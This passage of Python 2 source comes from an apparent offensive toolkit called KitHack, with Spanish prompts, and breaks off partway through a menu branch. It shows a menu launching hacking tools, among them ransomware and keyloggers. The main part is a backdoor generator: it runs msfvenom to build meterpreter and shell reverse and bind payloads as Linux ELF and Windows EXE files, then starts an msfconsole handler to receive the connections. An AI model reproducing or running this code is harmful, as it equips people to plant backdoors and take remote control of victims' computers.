		print '{0}23){1} Slacksec                {2}Kit basico de herramientas hacking.'.format(WHITE, YELLOW, DEFAULT)
		print '{0} 0){1} Back'.format(WHITE, YELLOW)	

		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
		
		if tool == 0:
			os.system('clear')
			banner(), menu(), options()
	
		elif tool == 1:
			kitools.TheFatRat()

		elif tool == 2:
			kitools.Msfpc()

		elif tool == 3:
			kitools.Fcrackzip()

		elif tool == 4:
			kitools.QRLjacker()

		elif tool == 5:
			kitools.Lazy()

		elif tool == 6:
			kitools.BlueThunderIPLocator()

		elif tool == 7:
			kitools.HTBINVITE()

		elif tool == 8:
			kitools.Ngrok()

		elif tool == 9:
			kitools.TheChoice()

		elif tool == 10:
			kitools.Ransomware()

		elif tool == 11:
			kitools.Bluepot()

		elif tool == 12:
			kitools.Setoolkit()

		elif tool == 13:
			kitools.A2sv()

		elif tool == 14:
			kitools.Fornonimizer()

		elif tool == 15:
			kitools.Saycheese()

		elif tool == 16:
			kitools.Easysploit()

		elif tool == 17:
			kitools.NXcrypt()

		elif tool == 18:
			kitools.KnockMail()

		elif tool == 19:
			kitools.RkHunter()

		elif tool == 20:
			kitools.HeraKeylogger()

		elif tool == 21:
			kitools.ZLogger()

		elif tool == 22:
			kitools.Xerosploit()

		elif tool == 23:
			kitools.Slacksec()

		else:
			print("\n{}[X] OPCION INVALIDA".format(RED))
			time.sleep(1.5)
			os.system('clear')
			banner(), menu(), options()		

	elif option == 10:
		os.system('clear')
		print("\033[01;31m")
		archivo = open("icons/msf.txt")
		print(archivo.read())

		#Sys msfvenom 
		print '{0} [*] {1}Sys Payloads:\n'.format(DEFAULT, GREEN)
		print '{0}[01] {1}LINUX {0}--> {2}Kithack.elf'.format(WHITE, YELLOW, RED)
		print '{0}[02] {1}WINDOWS {0}--> {2}Kithack.exe'.format(WHITE, YELLOW, RED)
		print '{0}[03] {1}ANDROID {0}--> {2}Kithack.apk'.format(WHITE, YELLOW, RED)
		print '{0}[04] {1}MAC OS {0}--> {2}Kithack.macho'.format(WHITE, YELLOW, RED)
		print '{0}[05] {1}PHP {0}--> {2}Kithack.php'.format(WHITE, YELLOW, RED)
		print '{0}[06] {1}PYTHON {0}--> {2}Kithack.py'.format(WHITE, YELLOW, RED)
		print '{0}[07] {1}BASH {0}--> {2}Kithack.sh'.format(WHITE, YELLOW, RED)
		print '{0}[08] {1}PERL {0}--> {2}Kithack.pl'.format(WHITE, YELLOW, RED)
		print '{0} [0] {1}Back'.format(WHITE, YELLOW)

		sys = input("{0}KitHack >> {1}".format(RED, DEFAULT))

		if sys == 0:
			os.system('clear')
			banner(), menu(), options()

		elif sys == 1:
			print '{0}\n[*] {1}Select Payload:\n'.format(DEFAULT, GREEN)
			print '{0}[01]{1} linux/x64/meterpreter_reverse_http'.format(WHITE, YELLOW)
			print '{0}[02]{1} linux/x64/meterpreter_reverse_https'.format(WHITE, YELLOW)
			print '{0}[03]{1} linux/x64/meterpreter_reverse_tcp'.format(WHITE, YELLOW)
			print '{0}[04]{1} linux/x64/shell_bind_tcp'.format(WHITE, YELLOW)
			print '{0}[05]{1} linux/x64/shell_reverse_tcp'.format(WHITE, YELLOW)
			print '{0}[06]{1} linux/x86/meterpreter_reverse_http'.format(WHITE, YELLOW)
			print '{0}[07]{1} linux/x86/meterpreter_reverse_https'.format(WHITE, YELLOW)
			print '{0}[08]{1} linux/x86/meterpreter_reverse_tcp'.format(WHITE, YELLOW)
			print '{0}[09]{1} linux/x86/shell_bind_tcp'.format(WHITE, YELLOW)
			print '{0}[10]{1} linux/x86/shell_reverse_tcp'.format(WHITE, YELLOW)

			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
			
			if pay == 1:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p linux/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			elif pay == 2:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p linux/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))
				location = os.getcwd()	
				print("\033[1;32m")
				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()			

			elif pay == 3:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			elif pay == 4:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p linux/x64/shell_bind_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/shell_bind_tcp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			elif pay == 5:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p linux/x64/shell_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))
				location = os.getcwd()	
				print("\033[1;32m")
				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			elif pay == 6:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p linux/x86/meterpreter_reverse_http LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))	
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			elif pay == 7:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p linux/x86/meterpreter_reverse_https LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()				

			elif pay == 8:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			elif pay == 9:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p linux/x86/shell_bind_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/shell_bind_tcp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			elif pay == 10:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p linux/x86/shell_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			else:
				print("\n{}[X] OPCION INVALIDA\n".format(RED))
				time.sleep(3)
				pause("{}Presione cualquier tecla para continuar...".format(GREEN))
				os.system('clear')
				banner(), menu(), options()	

		elif sys == 2:
			print '{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN)
			print '{0}[01]{1} windows/x64/meterpreter_reverse_http'.format(WHITE, YELLOW)
			print '{0}[02]{1} windows/x64/meterpreter_reverse_https'.format(WHITE, YELLOW)
			print '{0}[03]{1} windows/x64/meterpreter_reverse_tcp'.format(WHITE, YELLOW)
			print '{0}[04]{1} windows/x64/powershell_reverse_tcp'.format(WHITE, YELLOW)
			print '{0}[05]{1} windows/x64/shell_reverse_tcp'.format(WHITE, YELLOW)
			print '{0}[06]{1} windows/meterpreter_reverse_http'.format(WHITE, YELLOW)
			print '{0}[07]{1} windows/meterpreter_reverse_https'.format(WHITE, YELLOW)
			print '{0}[08]{1} windows/meterpreter_reverse_tcp'.format(WHITE, YELLOW)
			print '{0}[09]{1} windows/meterpreter/reverse_tcp_dns'.format(WHITE, YELLOW)
			print '{0}[10]{1} windows/metsvc_reverse_tcp'.format(WHITE, YELLOW)
			print '{0}[11]{1} windows/powershell_reverse_tcp'.format(WHITE, YELLOW)
			print '{0}[12]{1} windows/shell_reverse_tcp'.format(WHITE, YELLOW)

			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))

			if pay == 1:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p windows/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()						

			elif pay == 2:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p windows/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			elif pay == 3:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			elif pay == 4:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p windows/x64/powershell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/powershell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			elif pay == 5:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p windows/x64/shell_reverse_tcp LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD windows/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			elif pay == 6:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p windows/meterpreter_reverse_http LHOST={0} LPORT={1} -f exe > output/{2}.exe'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.exe'.format(OUT)).st_size != 0:					
					print("Backdoor guardado en {0}/output/{1}.exe".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
